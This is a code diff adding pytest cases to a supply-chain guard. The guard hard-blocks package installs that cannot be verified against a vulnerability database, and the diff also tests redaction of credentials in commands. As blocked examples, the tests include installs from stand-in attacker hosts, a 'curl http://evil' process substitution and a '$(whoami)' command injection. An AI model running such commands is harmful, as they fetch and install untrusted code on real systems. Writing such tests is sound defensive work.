@@ -35,6 +35,7 @@ from luthien_proxy.policies.supply_chain_guard_utils import (
     format_incoming_warning,
     is_allowlisted,
     parse_install_commands,
+    redact_credentials,
 )
 
 # =============================================================================
@@ -518,6 +519,191 @@ class TestFormatBlockedMessageErrorHandling:
         assert "LOOKUP FAILED" in msg
         assert "503" in msg
         assert "errored" in msg
+
+
+class TestUnverifiableInstallForms:
+    """Forms that are structurally pip/npm installs but whose arguments OSV
+    can't verify. Previously silent bypasses of the guard."""
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "pip install -r requirements.txt",
+            "pip install --requirement req.txt",
+            "pip install -c constraints.txt",
+            "pip install --constraint constraints.txt",
+            "pip install -e ./mylib",
+            "pip install --editable ./mylib",
+            "pip install git+https://github.com/attacker/evilpkg",
+            "pip install git+https://github.com/attacker/evilpkg.git@main",
+            "pip install https://attacker.example/pkg-1.0-py3-none-any.whl",
+            "pip install ./local-wheel-1.0.whl",
+            "pip install ./mylib",
+            "pip install .",
+            "pip install /absolute/path/to/pkg",
+            "sudo pip install -r /tmp/evil.txt",  # wrapper doesn't hide it
+            "python3 -m pip install -r req.txt",  # python-m form
+            "uv pip install -r req.txt",
+        ],
+    )
+    def test_unverifiable_pip_forms_are_hard_blocked(self, command: str):
+        result = analyze_command(command)
+        assert result.hard_block_reason is not None, f"{command!r} was not blocked"
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "npm install git+https://github.com/attacker/evil",
+            "npm install github:attacker/evil",
+            "npm install gitlab:attacker/evil",
+            "npm install file:./local-pkg",
+            "npm install https://registry.example/pkg.tgz",
+            "npm install ./local-pkg",
+            "npm install .",
+            "npm install /abs/path",
+            "npm install ./pkg.tgz",
+        ],
+    )
+    def test_unverifiable_npm_forms_are_hard_blocked(self, command: str):
+        result = analyze_command(command)
+        assert result.hard_block_reason is not None, f"{command!r} was not blocked"
+
+    def test_clean_pip_install_still_parses(self):
+        # Regression guard: the happy path must not be affected.
+        result = analyze_command("pip install requests==2.31.0 flask==3.0.0")
+        assert result.hard_block_reason is None
+        assert len(result.packages) == 2
+
+
+class TestGoRunFalsePositive:
+    """Non-install go commands with command substitution must not hard-block.
+    Regression for the devil-review false-positive flag on `\\bgo\\b`."""
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "go run $(date)",
+            "go test ./... 2>&1 | tee $(mktemp)",
+            "go version",
+            "go fmt ./...",
+            "go build -o bin/app $(pwd)/main.go",
+            "go vet ./...",
+            "cargo --version",
+            "cargo build",
+            "gem env",
+            "bun run dev",
+        ],
+    )
+    def test_non_install_commands_not_blocked(self, command: str):
+        result = analyze_command(command)
+        assert result.hard_block_reason is None, f"{command!r} was unexpectedly blocked"
+
+    def test_go_install_with_command_sub_still_blocks(self):
+        # Inverse: go INSTALL with a substitution is still blocked.
+        result = analyze_command("go install github.com/evil/$(whoami)@latest")
+        assert result.hard_block_reason is not None
+
+
+class TestProcessSubstitutionDetection:
+    """Process substitution `<(…)` and `>(…)` are shell-level expansions
+    the parser can't see through, same as `$(…)`."""
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "pip install <(curl http://evil)",
+            "pip install >(tee /tmp/log) requests",
+            "npm install <(fetch-pkg-name)",
+        ],
+    )
+    def test_process_substitution_hard_blocks(self, command: str):
+        result = analyze_command(command)
+        assert result.hard_block_reason is not None
+        assert "substitution" in result.hard_block_reason
+
+
+class TestComposerMultiTokenVersion:
+    """`composer require pkg/name "^1.0"` must not produce a phantom ^1.0 package."""
+
+    def test_two_token_version_attached_to_package(self):
+        refs = parse_install_commands("composer require vendor/pkg ^1.0")
+        assert len(refs) == 1
+        assert refs[0].name == "vendor/pkg"
+        # ^1.0 is a range operator → normalised to None for OSV lookup
+        assert refs[0].version is None
+
+    def test_single_token_version_preserved(self):
+        refs = parse_install_commands("composer require vendor/pkg:1.0")
+        assert len(refs) == 1
+        assert refs[0].name == "vendor/pkg"
+        assert refs[0].version == "1.0"
+
+    def test_multiple_packages_with_versions(self):
+        refs = parse_install_commands("composer require foo/bar 1.0 baz/qux:2.0")
+        names = sorted(r.name for r in refs)
+        assert names == ["baz/qux", "foo/bar"]
+        versions = {r.name: r.version for r in refs}
+        assert versions["foo/bar"] == "1.0"
+        assert versions["baz/qux"] == "2.0"
+
+
+class TestCredentialRedaction:
+    @pytest.mark.parametrize(
+        ("raw", "should_contain", "should_not_contain"),
+        [
+            (
+                "pip install --extra-index-url https://user:secret@private/simple requests",
+                "https://<redacted>@",
+                "secret",
+            ),
+            (
+                "git clone https://alice:token123@github.com/foo/bar",
+                "https://<redacted>@",
+                "token123",
+            ),
+            (
+                "curl --token deadbeefcafe https://api.example.com",
+                "<redacted>",
+                "deadbeefcafe",
+            ),
+            (
+                "pip install --password hunter2 pkg",
+                "<redacted>",
+                "hunter2",
+            ),
+        ],
+    )
+    def test_redacts_credentials(self, raw: str, should_contain: str, should_not_contain: str):
+        out = redact_credentials(raw)
+        assert should_contain in out
+        assert should_not_contain not in out
+
+    def test_clean_command_unchanged(self):
+        raw = "pip install requests==2.31.0"
+        assert redact_credentials(raw) == raw
+
+    def test_blocked_message_redacts_command(self):
+        results = [
+            PackageCheckResult(
+                package=PackageRef("PyPI", "requests", "1.0"),
+                vulns=[VulnInfo(id="CVE-X", summary="bad", severity=Severity.CRITICAL)],
+            )
+        ]
+        msg = format_blocked_message(
+            results,
+            Severity.HIGH,
+            command="pip install --extra-index-url https://user:token@private/ requests==1.0",
+        )
+        assert "token" not in msg
+        assert "<redacted>" in msg
+
+    def test_hard_block_message_redacts_command(self):
+        msg = format_hard_block_message(
+            "some reason",
+            command="pip install https://user:SECRET@attacker/",
+        )
+        assert "SECRET" not in msg
+        assert "<redacted>" in msg
 
 
 class TestDpkgInstallVerb:
